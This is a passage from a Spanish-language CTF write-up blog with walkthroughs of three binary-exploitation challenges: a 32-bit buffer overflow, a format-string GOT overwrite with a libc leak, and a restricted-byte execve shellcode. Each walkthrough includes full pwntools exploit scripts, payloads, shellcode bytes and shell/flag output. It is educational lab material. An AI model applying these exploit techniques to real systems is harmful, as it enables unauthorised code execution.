 Pero esta no es la dirección real de la cadena, solo es un offset. Para calcular la dirección real, tenemos que sumarle la dirección base del binario, que es 0x8048000, ya que es un binario de 32 bits sin protección PIE (como muestra la salida de checksec arriba). Por tanto, la dirección de la cadena en tiempo de ejecución será 0x8048799.\nFinalmente, otro campo interesante de nuestro payload será la dirección de retorno. Esta no es tan importante en este reto, por lo que decidí rellenarla con bytes nulos, pero se podría utilizar la dirección del main, por ejemplo, para evitar causar una denegación de servicio (DoS).\nUtilizando un script en Python con pwntools, podemos explotar el binario con este código:\n#!/usr/bin/env python3 from pwn import context, ELF, p32 elf = ELF('color') context.binary = elf p = elf.process() offset = 52 junk = b'A' * offset payload = junk payload += p32(0x8048450) payload += p32(0) payload += p32(0x8048799) p.sendlineafter(b'Enter your favorite color: ', payload) p.interactive()  Si lo ejecutamos en local, obtenemos una consola de comandos:\n$ python3 solve.py [*] './color' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './color': pid 944522 [*] Switching to interactive mode $ ls color solve.py  Ahora necesitamos ejecutarlo en la instancia remota. Sin embargo, no está escuchando en ningún puerto. Por suerte, la máquina tiene socat instalado y podemos abrir un puerto para redirigir el tráfico a color:\ncolor@ubuntu-512mb-nyc3-01:~$ which socat /usr/bin/socat color@ubuntu-512mb-nyc3-01:~$ socat tcp-l:1234,reuseaddr,fork EXEC:./color  En este punto ya podemos interactuar con el programa en el puerto 1234. Vamos a añadir una función al script y utilizar la magia de pwntools para quitar las direcciones hardcoded:\n#!/usr/bin/env python3 from pwn import context, ELF, p32, remote elf = ELF('color') context.binary = elf def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) p = get_process() offset = 52 junk = b'A' * offset payload = junk payload += p32(elf.plt.system) payload += p32(0) payload += p32(next(elf.search(b'/bin/sh'))) p.sendlineafter(b'Enter your favorite color: ', payload) p.interactive()  Finalmente, podemos lanzarlo y conseguir la flag:\n$ python3 solve.py 104.131.79.111 1234 [*] './color' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to 104.131.79.111 on port 1234: Done [*] Switching to interactive mode $ ls Makefile color color.c flag.txt $ cat flag.txt CTFlearn{c0lor_0f_0verf1ow}  El exploit completo se puede encontrar aquí: solve.py.\nExiste una manera más sencilla de realizar la explotación. Resulta que en el código hay una llamada explícita a system(\u0026quot;/bin/sh\u0026quot;), y como tenemos una vulnerabilidad de Buffer Overflow, podemos redirigir el flujo de ejecución del programa a la dirección de esta instrucción.\nEn primer lugar, podemos extraer el código ensamblador con objdump (o con GDB), y luego buscar la llamada a system:\n$ objdump --disassemble=main color | grep -C 4 system 804866f: e8 cc fd ff ff call 8048440 \u0026lt;puts@plt\u0026gt; 8048674: 83 c4 10 add $0x10,%esp 8048677: 83 ec 0c sub $0xc,%esp 804867a: 68 99 87 04 08 push $0x8048799 804867f: e8 cc fd ff ff call 8048450 \u0026lt;system@plt\u0026gt; 8048684: 83 c4 10 add $0x10,%esp 8048687: eb 10 jmp 8048699 \u0026lt;main+0xba\u0026gt; 8048689: 83 ec 0c sub $0xc,%esp 804868c: 68 a1 87 04 08 push $0x80487a1  La dirección a la que hay que saltar es 0x8048674, que es un poco antes de la propia llamada a system porque es donde se está preparando dicha llamada (se está poniendo \u0026quot;/bin/sh\u0026quot; como argumento en la pila).\nEn local funciona, poniendo la dirección en little-endian y añadiendo cat para mantener la entrada de usuario abierta:\n$ (python3 -c 'import os; os.write(1, b\"A\" * 52 + b\"\\x77\\x86\\x04\\x08\")'; cat) | ./color Enter your favorite color: ls color solve.py  Y en el servidor funciona también (sin necesidad de usar socat):\ncolor@ubuntu-512mb-nyc3-01:~$ (python3 -c 'import os; os.write(1, b\"A\" * 52 + b\"\\x77\\x86\\x04\\x08\")'; cat) | ./color Enter your favorite color: ls Makefile color color.c flag.txt cat flag.txt CTFlearn{c0lor_0f_0verf1ow}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/favorite-color/","section":"ctf","summary":"Binario de 32 bits. Buffer Overflow. Llamada a una función con argumentos","time":5,"title":"Favorite Color"},{"contents":"Se nos proporciona un binario de 64 bits llamado chall:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.\nComo recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:\n$$ a ^ n + b ^ n = z ^ n $$\nPara $n \u0026gt; 2$.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;math.h\u0026gt; #define SIZE 0x100 void main(void) { char A[SIZE]; char B[SIZE]; int a = 0; int b = 0; puts(\"Welcome to Fermat\\\\'s Last Theorem as a service\"); setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); printf(\"A: \"); read(0, A, SIZE); printf(\"B: \"); read(0, B, SIZE); A[strcspn(A, \"\\n\")] = 0; B[strcspn(B, \"\\n\")] = 0; a = atoi(A); b = atoi(B); if (a == 0 || b == 0) { puts(\"Error: could not parse numbers!\"); return 1; } char buffer[SIZE]; snprintf(buffer, SIZE, \"Calculating for A: %s and B: %s\\n\", A, B); printf(buffer); int answer = -1; for (int i = 0; i \u0026lt; 100; i++) { if (pow(a, 3) + pow(b, 3) == pow(i, 3)) { answer = i; } } if (answer != -1) printf(\"Found the answer: %d\\n\", answer); }  En el código fuente vemos una vulnerabilidad de Format String:\nsnprintf(buffer, SIZE, \"Calculating for A: %s and B: %s\\n\", A, B); printf(buffer);  Ya que podemos incluir formatos en la variable buffer, que es el primer argumento de printf. Sin embargo, necesitamos insertar un número válido en A y B:\nprintf(\"A: \"); read(0, A, SIZE); printf(\"B: \"); read(0, B, SIZE); A[strcspn(A, \"\\n\")] = 0; B[strcspn(B, \"\\n\")] = 0; a = atoi(A); b = atoi(B);  Pero esto es fácil. Vamos a probar:\n$ ./chall Welcome to Fermat\\'s Last Theorem as a service A: 1.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x B: 1 Calculating for A: 1.400bd8.97161728.0.ffffffff.97161350.0.0.97161580.1.78252e31.252e7825.2e78252e.78252e78.252e7825 and B: 1  Como podemos ver, estamos extrayendo valores de la pila (stack). Y también vemos que la cadena de formatos comienza en la posición 10 (offset 10):\n$ ./chall Welcome to Fermat\\'s Last Theorem as a service A: 1AAA%10$x B: 1 Calculating for A: 1AAA41414131 and B: 1  El programa termina después de introducir los datos. Necesitamos encontrar una manera de ejecutar el programa de nuevo pero sin parar el proceso. Esto se puede hacer explotando la vulnerabilidad de Format String, ya que existe un formato %n que permite escribir el número de bytes escritos hasta el formato %n en la dirección dada como parámetro (el valor de la posición en la pila).\nVemos que el binario tiene la protección Partial RELRO, lo que indica que la GOT no se puede sobrescribir durante un Buffer Overflow, pero sí que se puede escribir con Format String. Por tanto, la idea es modificar una entrada de la GOT para que una función apunte a la dirección del \u0026lsquo;main y así volver a ejecutar el programa.\n$ gdb -q chall Reading symbols from chall... (No debugging symbols found in chall) gef➤ break main Breakpoint 1 at 0x40083b gef➤ run Starting program: ./chall Breakpoint 1, 0x000000000040083b in main ()  Ahora podemos ver las entradas de la GOT:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x4006c6 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x4006e6 [0x601030] printf@GLIBC_2.2.5 → 0x4006f6 [0x601038] snprintf@GLIBC_2.2.5 → 0x400706 [0x601040] pow@GLIBC_2.2.5 → 0x400716 [0x601048] strcspn@GLIBC_2.2.5 → 0x400726 [0x601050] read@GLIBC_2.2.5 → 0x400736 [0x601058] atoi@GLIBC_2.2.5 → 0x400746  Desde el punto donde está la vulnerabilidad de printf, solamente se llama a pow y a printf. No nos interesa cambiar printf, por lo que habrá que modificar la entrada de pow.\nPrimero, vamos a poner la dirección en una posición de la pila. Para ello, utilizamos la variable A para poner la dirección y la variable B para extraerla. Pero antes, vamos a hacerlo con caracteres reconocibles:\n$ ./chall Welcome to Fermat\\'s Last Theorem as a service A: 1234567.AAAABBBB B: 1.%11$lx Calculating for A: 1234567.AAAABBBB and B: 1.4242424241414141  Nótese el uso de %lx para imprimir un valor de 8 bytes, y la posición 11, porque en la posición 10 tenemos 1234567..\nAhora, podemos reemplazar AAAABBBB con la dirección de pow en la GOT. Y en lugar de poner %11$lx, pondremos %11$n. Vamos a hacerlo en un script en Python con pwntools y adjuntar GDB para visualizar las entradas de la GOT:\npayload_a = b'1234567.' + p64(pow_got) payload_b = b'1.%11$n' gdb.attach(p, gdbscript='break pow\\ncontinue\\ngot') p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.interactive()  Si ejecutamos el script, GDB toma el proceso, se para en pow y muestra la GOT:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x7f4c7b0845a0 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x7f4c7b08bc50 [0x601030] printf@GLIBC_2.2.5 → 0x7f4c7b061e10 [0x601038] snprintf@GLIBC_2.2.5 → 0x7f4c7b061ee0 [0x601040] pow@GLIBC_2.2.5 → 0x28 [0x601048] strcspn@GLIBC_2.2.5 → 0x7f4c7b1837b0 [0x601050] read@GLIBC_2.2.5 → 0x7f4c7b10e130 [0x601058] atoi@GLIBC_2.2.5 → 0x7f4c7b044730  La entrada de pow se ha cambiado a 0x28 (40). Esto significa que hasta $11$n se han impreso 40 bytes. Como hemos puesto 1. antes de %11$n, hay 38 bytes en la pila antes. Si ponemos 1.., la entrada de la GOT cambiaría a 0x29 y sucesivamente.\nEn este momento, necesitamos introducir la dirección del main (0x400837, que es 4196407 en decimal) en la entrada de la GOT. Sin embargo, no podemos introducir tantos caracteres porque son demasiados.\nPero podemos utilizar otro formato. Como la dirección que necesitamos escribir es 4196407, entonces necesitamos que se impriman 4196407 - 38 - 2 = 4196367 bytes. Y esto se puede hacer con un formato como %4196367c.\npow_got = 0x601040 payload_a = b'1234567.' + p64(pow_got) payload_b = b'1.%4196367c' + b'%11$n' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.interactive()  El cálculo del número de bytes a imprimir se puede realizar así también:\npow_got = 0x601040 bytes_on_stack = 38 bytes_to_print = main_addr - bytes_on_stack - 2 payload_a = b'1234567.' + p64(pow_got) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$n'  Y funciona, hemos convertido pow en main:\n$ python3 solve.py [+] Starting local process './chall': pid 389440 [*] Switching to interactive mode Welcome to Fermat\\'s Last Theorem as a service A: $ 1 B: $ 1 Calculating for A: 1 and B: 1 Welcome to Fermat\\'s Last Theorem as a service A: $ 1 B: $ 1 Calculating for A: 1 and B: 1 Welcome to Fermat\\'s Last Theorem as a service A: $  Ahora tenemos más opciones para continuar con la explotación. Lo siguiente es fugar una dirección de Glibc para obtener su versión. El propósito de esto es calcular la dirección real de system y ponerla en otra entrada de la GOT para la fase final.\nPara fugar una dirección podemos utilizar la vulnerabilidad de Format String. Para ello, tenemos que llamar a printf con el formato %s (las cadenas de caracteres en C son dadas como punteros) y pasarle una dirección de la GOT (por ejemplo, puts), de manera que el valor de la entrada de la GOT se imprima (funciona como un puntero).\nLa estrategia es similar: utilizamos la variable A para almacenar la dirección de la GOT para puts. Y después ponemos %11$s en la variable B:\nputs_got = 0x601018 payload_a = b'1234567.' + p64(puts_got) payload_b = b'1.%11$s' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvuntil(b'B: 1.') puts_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.success(f'Leaked puts() address: {hex(puts_addr)}')  Después de esto, podemos calcular la dirección base de Glibc, sabiendo el offset de puts:\n$ ldd chall linux-vdso.so.1 (0x00007ffda1df7000) libm.so.6 = /lib/x86_64-linux-gnu/libm.so.6 (0x00007f576d29c000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f576d0aa000) /lib64/ld-linux-x86-64.so.2 (0x00007f576d3fe000) $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts 194: 00000000000875a0 476 FUNC GLOBAL DEFAULT 16 _IO_puts@@GLIBC_2.2.5 429: 00000000000875a0 476 FUNC WEAK DEFAULT 16 puts@@GLIBC_2.2.5 504: 00000000001273c0 1268 FUNC GLOBAL DEFAULT 16 putspent@@GLIBC_2.2.5 690: 0000000000129090 728 FUNC GLOBAL DEFAULT 16 putsgent@@GLIBC_2.10 1158: 0000000000085e60 384 FUNC WEAK DEFAULT 16 fputs@@GLIBC_2.2.5 1705: 0000000000085e60 384 FUNC GLOBAL DEFAULT 16 _IO_fputs@@GLIBC_2.2.5 2342: 00000000000914a0 159 FUNC WEAK DEFAULT 16 fputs_unlocked@@GLIBC_2.2.5  puts_offset = 0x875a0 glibc_base_addr = puts_addr - puts_offset log.success(f'Glibc base address: {hex(glibc_base_addr)}')  Con todo esto, hemos fugado la dirección de puts y calculado la dirección base de Glibc:\n$ python3 solve.py [+] Starting local process './chall': pid 414163 [+] Leaked puts() address: 0x7f4a695695a0 [+] Glibc base address: 0x7f4a694e2000 [*] Switching to interactive mode Welcome to Fermat\\'s Last Theorem as a service A: $  Ahora podemos buscar el offset de system en Glibc:\n$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 236: 0000000000156a80 103 FUNC GLOBAL DEFAULT 16 svcerr_systemerr@@GLIBC_2.2.5 617: 0000000000055410 45 FUNC GLOBAL DEFAULT 16 __libc_system@@GLIBC_PRIVATE 1427: 0000000000055410 45 FUNC WEAK DEFAULT 16 system@@GLIBC_2.2.5  La idea es modificar la entrada de la GOT de una función que tome como primer argumento una cadena de caracteres controlada por nosotros para que apunte a system. Por ejemplo, funciones de este tipo son atoi y strcspn. Esta vez, estaremos utilizando atoi, cuya dirección en la GOT es 0x601058.\natoi_got = 0x601058 system_offset = 0x55410 system_addr = glibc_base_addr + system_offset  Ahora tenemos que escribir la dirección real de system en la entrada GOT de atoi. Vamos a introducir 0 bytes y ver qué valor se inserta en la GOT utilizando GDB como anteriormente:\npayload_a = b'1234567.' + p64(pow_got) payload_b = b'1.%11$n' gdb.attach(p, gdbscript='break atoi\\ncontinue\\ngot') p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.interactive()  Si lo ejecutamos, GDB se añade al proceso, se para en atoi y muestra la GOT:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x7f660b8465a0 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x7f660b84dc50 [0x601030] printf@GLIBC_2.2.5 → 0x7f660b823e10 [0x601038] snprintf@GLIBC_2.2.5 → 0x7f660b823ee0 [0x601040] pow@GLIBC_2.2.5 → 0x400837 [0x601048] strcspn@GLIBC_2.2.5 → 0x7f660b9457b0 [0x601050] read@GLIBC_2.2.5 → 0x7f660b8d0130 [0x601058] atoi@GLIBC_2.2.5 → 0x7f6600000028  Como se puede ver, la entrada de atoi tiene valor 0x7f6600000028. Con %11$n hemos sobrescrito los últimos 4 bytes (es decir, 0x00000028). Utilizando el mismo procedimiento de antes, necesitamos escribir un montón de bytes. El número de bytes a introducir se puede calcular como:\nbytes_on_stack = 38 bytes_to_print = (system_addr - bytes_on_stack - 2) \u0026amp; 0xffffffff  Limitamos el número a 4 bytes por si acaso. Y después lo añadimos al payload y lo enviamos:\nbytes_to_print = (system_addr - bytes_on_stack - 2) \u0026amp; 0xffffffff payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$n' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvline() p.interactive()  Si todo es correcto, la entrada de atoi en la GOT apuntará a system. Y por tanto, podemos introducir /bin/sh en A o B y obtener una consola de comandos:\n$ python3 solve.py [+] Starting local process './chall': pid 502833 [+] Leaked puts() address: 0x7f4a096565a0 [+] Glibc base address: 0x7f4a095cf000 [*] Switching to interactive mode Welcome to Fermat\\'s Last Theorem as a service A: $ /bin/sh B: $ $ ls chall chall.c Dockerfile solve.py  Todo bien. Vamos a perfeccionar el exploit un poco para que nos dé la shell automáticamente:\np.sendlineafter(b'A: ', b'/bin/sh') p.sendlineafter(b'B: ', b'') p.recvuntil(b'B: ') p.sendline() p.interactive()  $ python3 solve.py [+] Starting local process './chall': pid 507100 [+] Leaked puts() address: 0x7f6218d5b5a0 [+] Glibc base address: 0x7f6218cd4000 [*] Switching to interactive mode $ ls chall chall.c Dockerfile solve.py  No obstante, aún no hemos terminado. Tenemos que lanzar el exploit contra la instancia remota y obtener la versión de Glibc. Después, actualizar los offsets.\nPara ayudar con la búsqueda de la versión, podemos fugar más direcciones de funciones de Glibc. Para ello, decidí programar una función llamada leak_address:\ndef leak_address(got_entry: int) -\u0026gt; int: payload_a = b'1234567.' + p64(got_entry) payload_b = b'1.%11$s' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvuntil(b'B: 1.') return u64(p.recvline().strip().ljust(8, b'\\0'))  De manera que se utilice así:\natoi_got = 0x601058 atoi_addr = leak_address(atoi_got) log.success(f'Leaked atoi() address: {hex(atoi_addr)}') puts_got = 0x601018 puts_addr = leak_address(puts_got) log.success(f'Leaked puts() address: {hex(puts_addr)}')  Lanzamos el exploit al servidor y no funciona. Sin problema por ahora. Vamos a verificar las direcciones fugadas:\n$ python3 solve.py mars.picoctf.net 31929 [+] Opening connection to mars.picoctf.net on port 31929: Done [+] Leaked atoi() address: 0x7f026a26c730 [+] Leaked puts() address: 0x7f026a2ac5a0 [+] Glibc base address: 0x7f026a225000  Estas son las versiones de Glibc encontradas (sus offsets son los mismos):\nObservamos que la versión de Glibc que tiene la instancia remota es la misma que tenemos en local.\nSin embargo, parece que la última etapa del exploit no funciona en remoto. Esto puede deberse a que estamos imprimiendo una gran cantidad de bytes para poder utilizar %n. Una mamera más elegante es usar %hhn para escribir un solo byte o %hn para escribir 2 bytes.\nVamos a modificar el payload para tener un exploit más estable. Por el momento, utilizaremos %hn. Los últimos bytes de la GOT pueden ser sobrescritos de manera similar a la de antes, solo con algunos cambios:\nbytes_to_print = ((system_addr \u0026amp; 0xffff) - bytes_on_stack - 2) % 0xffff payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$hn' payload_b += f'%12$hn'.encode() gdb.attach(p, gdbscript='break atoi\\ncontinue\\ncontinue\\ncontinue\\ngot') p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvline() p.interactive()  Lo primero a notar es el uso de operadores AND para coger los 2 últimos bytes de la dirección de system. Y luego está el operador módulo 0xffff para evitar números negativos. Después utilizamos %11$hn.\nPara sobrescribir los siguientes 2 bytes, necesitamos poner la dirección de atoi en la GOT pero más 2 (ya que queremos escribir los siguientes 2 bytes). Y por tanto, necesitamos utilizar %12$hn. Por el momento, dejamos la segunda parte varía (solo %12$hn).\nAñadimos el proceso a GDB y mostramos las entradas de la GOT:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x7f70473075a0 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x7f704730ec50 [0x601030] printf@GLIBC_2.2.5 → 0x7f70472e4e10 [0x601038] snprintf@GLIBC_2.2.5 → 0x7f70472e4ee0 [0x601040] pow@GLIBC_2.2.5 → 0x400837 [0x601048] strcspn@GLIBC_2.2.5 → 0x7f70474067b0 [0x601050] read@GLIBC_2.2.5 → 0x7f7047391130 [0x601058] atoi@GLIBC_2.2.5 → 0x7f7054105410  Se observa que los dos últimos bytes fueron sobrescritos correctamente (al menos los 3 últimos dígitos hexadecimales son 410, coinciden con el offset de system). Y además, vemos que los siguientes 2 bytes tienen el mismo valor que los 2 últimos bytes (5410).\nSabiendo esto, podemos calcular el número de bytes a escribir para lograr poner el número correcto en esa posición:\nbytes_to_print = ((system_addr \u0026amp; 0xffff) - bytes_on_stack - 2) % 0xffff payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$hn' bytes_to_print = (((system_addr \u0026gt;\u0026gt; 16) - system_addr) \u0026amp; 0xffff) % 0xffff payload_b += f'%{bytes_to_print}c'.encode() + b'%12$hn' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvline() p.interactive()  Y todo funciona genial en local:\n$ python3 solve.py [+] Starting local process './chall': pid 547640 [+] Leaked atoi() address: 0x7f05651e4730 [+] Leaked puts() address: 0x7f05652245a0 [+] Glibc base address: 0x7f056519d000 [*] Switching to interactive mode $ ls chall chall.c Dockerfile solve.py  Vamos a ver en remoto:\n$ python3 solve.py mars.picoctf.net 31929 [+] Opening connection to mars.picoctf.net on port 31929: Done [+] Leaked atoi() address: 0x7fc3974da730 [+] Leaked puts() address: 0x7fc39751a5a0 [+] Glibc base address: 0x7fc397493000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/","section":"ctf","summary":"picoMini by redpwn. 250 puntos. Binario de 64 bits. Format String. Sobrescritura de la GOT y bypass de ASLR","time":10,"title":"fermat-strings"},{"contents":"Se nos proporciona un binario de 32 bits llamado fun:\nArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments  No tenemos el código fuente en C. Esta vez, en lugar de hacer ingeniería inversa con Ghidra, analizaremos el binario con GDB.\nPrimero, vamos a ejecutar el programa:\n$ ./fun Give me code to run: asdf zsh: segmentation fault (core dumped) ./fun  Parece que el programa pide código para ejecutarlo. El programa falla porque asdf no es una instrucción válida.\nVamos a generar dos instrucciones de breakpoint (SIGTRAP, int3 en ensamblador) utilizando asm de pwntools:\n$ pwn asm 'int3; int3' cccc $ pwn asm 'int3; int3' -o code $ xxd code 00000000: cccc ..  Podemos iniciar GDB y ejecutar el programa con este código:\n$ gdb -q fun Reading symbols from fun... (No debugging symbols found in fun) gef➤ run 0xffffcc01 in ?? ()  Genial, se ha parado en el breakpoint. Vamos a ver cuáles son las siguientes instrucciones desde $eip (menos uno para poder ver la primera instrucción también):\ngef➤ x/10i $eip - 1 0xffffcc00: int3 =\u0026gt; 0xffffcc01: int3 0xffffcc02: nop 0xffffcc03: nop 0xffffcc04: (bad) 0xffffcc05: call DWORD PTR [eax-0x6f000070] 0xffffcc0b: nop 0xffffcc0c: (bad) 0xffffcc0d: call DWORD PTR [eax-0x6f000070] 0xffffcc13: nop 0xffffcc14: (bad) gef➤ x/10x $eip - 1 0xffffcc01: 0x9090cccc 0x9090ffff 0x9090ffff 0x9090ffff 0xffffcc11: 0x9090ffff 0x9090ffff 0x9090ffff 0x9090ffff 0xffffcc21: 0x9090ffff 0x9090ffff  Parece un poco extraño. Vamos a añadir más código arbitrario y comprobamos otra vez:\n$ echo -ne '\\xcc\\xccABCDEFGHIJKL'  code $ xxd code 00000000: cccc 41 4243 4445 4647 4849 4a4b 4c ..ABCDEFGHIJKL  gef➤ run 0xffffcc01 in ?? ()  gef➤ x/10x $eip - 1 0xffffcc00: 0x9090cccc 0x90904241 0x90904443 0x90904645 0xffffcc10: 0x90904847 0x90904a49 0x90904c4b 0x9090ffff 0xffffcc20: 0x9090ffff 0x9090ffff  Ahora se ve claramente lo que hace el programa: está cogiendo nuestro código e insertando dos instrucciones nop (\\x90\\x90) entre cada byte de nuestro código.\nLa instrucción nop no hace nada, por lo que no será problemática. Sin embargo, nos limita a utilizar instrucciones de 1 ó 2 bytes (si no, las dos instrucciones nop partirán nuestras instrucciones de más de 2 bytes).\nEl shellcode clásico para obtener una shell es similar a este:\nxor ecx, ecx # 31 c9 =\u0026gt; $ecx = 0 xor edx, edx # 31 d2 =\u0026gt; $edx = 0 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0xb # b0 0b =\u0026gt; $eax = 0xb push 0x68732f # 68 2f 2f 73 00 =\u0026gt; Push \"/sh\\0\" push 0x6e69622f # 68 2f 62 69 6e =\u0026gt; Push \"/bin\" mov ebx, esp # 89 e3 =\u0026gt; $ebx = *\"/bin/sh\\0\" int 0x80 # cd 80 =\u0026gt; Call execve  El problema de este shellcode es el procedimiento para subir \u0026quot;/bin/sh\\0\u0026quot; a la pila (stack), ya que se utilizan instrucciones de 5 bytes. Por tanto, necesitamos subir de alguna manera la cadena \u0026quot;/bin/sh\\0\u0026quot; a la pila utilizando solamente instrucciones de 1 ó 2 bytes.\nUna manera puede ser guardando la cadena de caracteres byte a byte. Podemos utilizar instrucciones como mov al, 0x2f para almacenar un solo byte en $eax con una instrucción de 2 bytes, y después realizar un desplazamiento a la izquierda para la siguiente posición.\nPor ejemplo, para \u0026quot;/sh\\0\u0026quot;, la idea es la siguiente:\npush 8 # 6a 08 nop # 90 pop ecx # 59 =\u0026gt; $ecx = 8 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x68 # b0 68 =\u0026gt; $eax = 0x00000068 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00006800 mov al, 0x73 # b0 73 =\u0026gt; $eax = 0x00006873 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00687300 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x0068732f (\"/sh\\0\") nop # 90 push eax # 50 =\u0026gt; Push \"/sh\\0\"  Como se puede observar, estamos utilizando shl eax, ecx para guardar en $eax el valor actual de $eax desplazado $ecx bits hacia la izquierda. Y dentro de $ecx tenemos 8, por lo que la instrucción shl eax, ecx desplazará $eax un byte a la izquierda. Por tanto, estamos acumulando la cadena en $eax.\nEl uso de nop antes de las instrucciones pop y push (instrucciones de 1 byte) se debe a que el programa añade dos instrucciones nop entre cada dos bytes de nuestro código. Si no ponemos esta instrucción nop, entonces la siguiente instrucción de 2 bytes será dividida en dos parte (y por tanto, no funcionará).\nPodemos seguir un proceso similar para tener \u0026quot;/bin\u0026quot; en la pila. Y finalmente, añadir estas dos etapas al shellcode mostrado anteriormente.\nEste es el código final que lanzará una consola de comandos utilizando execve(\u0026quot;/bin/sh\u0026quot;, 0, 0):\npush 8 # 6a 08 nop # 90 pop ecx # 59 =\u0026gt; $ecx = 8 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x68 # b0 68 =\u0026gt; $eax = 0x00000068 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00006800 mov al, 0x73 # b0 73 =\u0026gt; $eax = 0x00006873 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00687300 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x0068732f (\"/sh\\0\") nop # 90 push eax # 50 =\u0026gt; Push \"/sh\\0\" xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x6e # b0 6e =\u0026gt; $eax = 0x0000006e shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00006e00 mov al, 0x69 # b0 69 =\u0026gt; $eax = 0x00006e69 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x006e6900 mov al, 0x62 # b0 62 =\u0026gt; $eax = 0x006e6962 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x6e696200 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x6e69622f (\"/bin\") nop # 90 push eax # 50 =\u0026gt; Push \"/bin\" xor ecx, ecx # 31 c9 =\u0026gt; $ecx = 0 xor edx, edx # 31 d2 =\u0026gt; $edx = 0 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x0b # b0 0b =\u0026gt; $eax = 0x0b mov ebx, esp # 89 e3 =\u0026gt; $ebx = *\"/bin/sh\\0\" int 0x80 # cd 80 =\u0026gt; execve  El archivo se llama code.asm, podemos traducirlo a código máquina utilizando asm de pwntools:\n$ pwn asm -i code.asm -o code $ xxd code 00000000: 6a08 9059 31c0 b068 d3e0 b073 d3e0 b02f j..Y1..h...s.../ 00000010: 9050 31c0 b06e d3e0 b069 d3e0 b062 d3e0 .P1..n...i...b.. 00000020: b02f 9050 31c9 31d2 31c0 b00b 89e3 cd80 ./.P1.1.1....... $ wc -c code 48 code  Se trata de un shellcode relativamente corto. Vamos a ver si funciona:\n$ (cat code; echo; cat) | ./fun Give me code to run: ls code code.asm fun  Perfecto, funciona bien. Nótese que hemos tenido que utilizar un comando echo para añadir un carácter de salto de línea y otro comando cat para mantener la consola activa.\nAhora podemos probar el código en la instancia remota para obtener la flag:\n$ (cat code; echo; cat) | nc mercury.picoctf.net 16460 Give me code to run: ls flag.txt fun fun.c xinet_startup.sh cat flag.txt picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}  Más tarde, continué trabajando en el shellcode. Finalmente, encontré una manera de acortarlo utilizando desplazamientos de 16 bits y los registros $ah, 